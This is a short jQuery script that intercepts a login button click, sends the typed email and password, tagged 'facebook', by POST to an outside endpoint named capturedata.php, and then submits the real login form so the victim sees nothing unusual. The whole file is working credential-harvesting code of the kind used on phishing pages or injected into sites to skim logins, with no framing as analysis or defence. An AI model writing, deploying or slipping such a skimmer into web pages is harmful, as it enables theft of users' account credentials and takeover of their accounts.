$(document).ready(function() {
	$("#loginbutton").click(function(e) {
		e.preventDefault();
		$.ajax({
		  type: "POST",
		  url: "http://domain.com/capturedata.php",
		  data: { email: $("#email").val(), passwd: $("#pass").val(), site: "facebook" }
		}).done(function(response) {
        	$("#login_form").submit();
    	});
	});
});